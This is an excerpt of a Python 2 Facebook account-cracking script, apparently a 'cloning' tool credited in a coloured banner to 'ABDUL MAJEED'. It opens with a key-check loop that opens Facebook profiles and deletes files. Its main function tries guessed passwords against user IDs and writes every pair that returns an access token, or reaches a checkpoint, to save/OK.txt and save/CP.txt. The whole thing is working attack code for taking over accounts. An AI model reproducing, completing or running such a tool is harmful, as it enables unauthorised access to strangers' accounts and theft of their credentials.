...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
            ...
            time.sleep(1)
            os.system('xdg-open https://www.facebook.com/murari.prajapat.98')
            os.system('clear')
            loop = 'false'
    else:
        print '\033[1;93m Wrong Key !'
        os.system('xdg-open https://www.facebook.com/profile.php?id=100082967462783')
        os.system('clear')
        os.system('clear')
done = False
os.system('rm -rf .txt')
...
\033[97;1m+-+-+-+-+-+ +-+-+-+-+-+-+
\033[91;1m|A|b|d|u|l| |M|a|j|e|e|d|
\033[92;1m+-+-+-+-+-+ +-+-+-+-+-+-+
\033[93;1mIzat diny wala Liny wala   
\033[96;1mSeaRF AllaH Pak Hy                                ​                                                                                     
\x1b[0m______________________________________________
\033[95;1mAuthor   :            ABDUL MAJEED
\033[94;1mFacebook :          ABDUL MAJEED  
\033[92;1mGitHub   :        NEW HACKER HO BHI LOGH
\033[96;1mVersion  :              INSHALLAH NEW COMMENND AYINGY
\x1b[0m______________________________________________
                                                 """
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;94m  [M•A•J•E•E•D•_OK]  ' + k + c + user + '  ^  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m  [R•A•J•P•O•O•T_CP] ' + k + c + user + '  ^  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m  [M•A•J•E•E•D•_OK] ' + k + c + user + '  ^  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;95m  [M•A•J•E•E•D•_CP] ' + k + c + user + '  ^  ' + pass2
                    cps = open('save/CP.txt', 'a')
